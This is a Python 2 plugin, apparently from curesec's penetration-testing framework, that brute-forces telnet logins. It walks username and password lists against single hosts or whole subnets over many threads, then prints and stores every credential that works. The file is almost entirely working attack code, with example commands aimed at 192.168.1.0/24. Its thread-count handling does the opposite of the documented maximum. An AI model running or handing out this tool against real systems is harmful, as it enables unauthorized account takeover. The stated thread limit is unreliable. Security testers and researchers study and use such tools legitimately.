#!/usr/bin/env python2

# Copyright (c) 2014, curesec GmbH
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification,
# are permitted provided that the following conditions are met:
#
# 1. Redistributions of source code must retain the above copyright notice, this list of
# conditions and the following disclaimer.
#
# 2. Redistributions in binary form must reproduce the above copyright notice, this list
# of conditions and the following disclaimer in the documentation and/or other materials
# provided with the distribution.
#
# 3. Neither the name of the copyright holder nor the names of its contributors may be used
# to endorse or promote products derived from this software without specific prior written
# permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS
# OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
# MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
# COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
# EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
# HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
# TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
# EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
import threading
import argparse
import sys
import re
from datetime import datetime
from ctools import cTelnet
from ctools import cUtil
from ctools import cTuples
import ccdClasses as ccd
import logging


__version__ = '0.0'
__author__ = 'feli'
__plgname__ = 'telnet_bruteforce'

# logging
#LOG = "/tmp/" + __plgname__ + ".log"
#FORMAT = '%(asctime)s - %(name)s - ' + \
#    '%(levelname)s - %(threadName)s - %(message)s'
#logging.basicConfig(filename=LOG,
#                    filemode="w",
#                    format=FORMAT,
#                    level=logging.DEBUG)

logger = logging.getLogger(__name__)
logger.setLevel(logging.DEBUG)

CRLF = '\r\n'


def brute(target, user, passw):
    ip, port = target
    port = int(port)
    status = False
    ustr = user + '@' + ip + ':' + str(port)
    if ustr in brute.inv_users:
        logger.info('found %s in inv users' % ustr)
        raise StopIteration
    tn = None
    try:
        tn = cTelnet.Telnet(
            ip,
            port=int(port),
            timeout=brute.to,
            use_ssl=brute.tls,
            verbose=False,
            # out=ustr + '.dbg'
        )
        tn.connect()
    except Exception as e:
        if tn:
            tn.close()
            logger.warning('Could not establish connection to telnet server %s:%d -> %s',
                           ip, port, e)
        raise StopIteration
    try:
        match = tn.expect((re.compile('login', re.IGNORECASE),
                           re.compile('username', re.IGNORECASE)),
                          timeout=5,
                          )
        if not match:
            return
        tn.write(user + CRLF)
        match = tn.expect((re.compile('password', re.IGNORECASE),
                           re.compile('incorrect', re.IGNORECASE)),
                          timeout=5,
                          )
        if not match:
            return
        if match.group().lower() not in ['incorrect', ]:
            tn.write(passw + CRLF)
            match = tn.expect((re.compile('last login', re.IGNORECASE),
                               re.compile('incorrect', re.IGNORECASE)),
                              timeout=5,
                              )
        if match and match.group().lower() in ['last login', ]:
            status = True
            with brute.lock:
                logger.info('adding %s to inv users' % ustr)
                brute.inv_users.append(ustr)
    except Exception, e:
        logger.warning('Error while communicating with %s:%d -> %s',
                       ip, port, e)
        logger.warning(e)
    r = (status, user, passw, ip, port)
    logger.info(repr(r))
    yield r
    if tn:
        tn.close()

    raise StopIteration


brute.tls = False
brute.to = 3
brute.inv_users = []
brute.lock = threading.Lock()


class TelnetBruteforce():
    def __init__(self,
                 args,
                 dbh=None):

        """
        Initialize and run TelnetBruteforce

        input:
            args            cmdline arguments without argv[0]
            dbh       database handler
        """

        self.dbh = dbh

        opt = parse(args)
        # configure bruteforce parameters for all targets
        brute.to = opt.to
        brute.tls = opt.tls

        expand_cb = lambda t: cUtil.mkIP2(t,
                                          ports=[opt.port],
                                          noResolve=True
                                          )
        prepare_cb = cUtil.isUp
        if opt.no_check:
            prepare_cb = None

        try:
            ig_targets = cTuples.cInputGenerator(data=opt.targets,
                                                 filename=opt.target_fn,
                                                 circle=False,
                                                 prepare_cb=prepare_cb,
                                                 expand_cb=expand_cb,
                                                 maxthreads=opt.nthreads,
                                                 )
        except cTuples.ENoInput:
            print 'Error: No Targets specified, please use the -t/T parameter to set target(s)'
            sys.exit(1)

        try:
            ig_users = cTuples.cInputGenerator(data=opt.users,
                                               filename=opt.user_fn,
                                               circle=True)
        except cTuples.ENoInput:
            print 'Error: No Usernames specified, please use the -u/U parameter to set usernames(s)'
            sys.exit(1)

        try:
            ig_passw = cTuples.cInputGenerator(data=opt.passw,
                                               filename=opt.passw_fn,
                                               circle=True)
        except cTuples.ENoInput:
            print 'Error: No Passwords specified, please use the -p/P parameter to set password(s)'
            sys.exit(1)

        ig_targets.start()
        ig_users.start()
        ig_passw.start()

        self.tuples = cTuples.cTuples(inputs=[ig_targets, ig_users, ig_passw],
                                      prep_callback=brute,
                                      maxthreads=opt.nthreads,
                                      delay=opt.delay)
        self.tuples.start()

    def start(self):

        """ Do the thing """

        start_time = datetime.now()

        row_fmt = "{:30} {:30} {:30}"
        print 'Bruteforcing Telnet logins ...'
        print '-' * 80
        print row_fmt.format('password', 'username', 'server')
        print '-' * 80
        for status, username, password, host, port in self.tuples.tuple_q:
            if status:
                print row_fmt.format(password, username, host + ':' + str(port))
                if self.dbh:
                    ip = ''
                    fqdn = ''
                    typ = cUtil.getTargetType(host)
                    if typ == cUtil.TTYPE.IP:
                        ip = host
                    if typ == cUtil.TTYPE.DOMAIN:
                        fqdn = host
                    br = ccd.BruteforceResult(
                        ip=ip,
                        fqdn=fqdn,
                        port=int(port),
                        username=username,
                        password=password,
                        service='telnet',
                    )
                    self.dbh.add(br)
                    #br = ccd.TelnetBruteforceResult(
                    #    host=host,
                    #    port=int(port),
                    #    user=username,
                    #    password=password,
                    #)
                    #self.dbh.add(br)

        self.tuples.join()

        print '-' * 80
        print "Finished in %fs" % cUtil.secs(start_time)


def parse(args):
    parser = argparse.ArgumentParser(
        prog=__plgname__,
        description="Bruteforce telnet logins",
        epilog=
        """Examples:
        telnet_bruteforce.plg -P pass.txt -U user.txt -nt 100 -t 192.168.1.0/24
        telnet_bruteforce.plg -p pass -u user -t 192.168.1.136 -port 23
        """,
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument('-T',
                        help='file containing host[:port] entries',
                        dest='target_fn'
                        )
    parser.add_argument('-t',
                        help='target targets',
                        nargs='+',
                        dest='targets',
                        default=[]
                        )
    parser.add_argument('-port',
                        help='target port (default 23)',
                        dest='port',
                        default=23,
                        type=int
                        )
    parser.add_argument('-delay',
                        help='delay in between bruteforce attempts',
                        dest='delay',
                        default=0.0,
                        type=float
                        )
    parser.add_argument('-U',
                        help='file containing username per line',
                        dest='user_fn',
                        )
    parser.add_argument('-u',
                        help='usernames',
                        default=[],
                        nargs='+',
                        dest='users',
                        )

    parser.add_argument('-P',
                        help='file containing password per line',
                        dest='passw_fn',
                        )
    parser.add_argument('-p',
                        help='passwords',
                        default=[],
                        nargs='+',
                        dest='passw',
                        )
    parser.add_argument('-nt',
                        help='number of threads (default 50, max 100)',
                        dest='nthreads',
                        type=int,
                        default=50
                        )
    parser.add_argument('-to',
                        help='Server timeout (default 3s)',
                        dest='to',
                        type=int,
                        default=3
                        )
    parser.add_argument('-tls',
                        help='use tls',
                        dest='tls',
                        action='store_true'
                        )
    parser.add_argument('-no_check',
                        help='disable host check.' +
                        'If you use this option, make sure not to use too many threads' +
                        'as the open file limit easily gets exhausted',
                        action='store_true',
                        dest='no_check',
                        )

    if not args or not args[0]:
        parser.print_help()
        sys.exit(1)

    opt = parser.parse_args(args)
    opt.nthreads = max(100, opt.nthreads)

    return opt
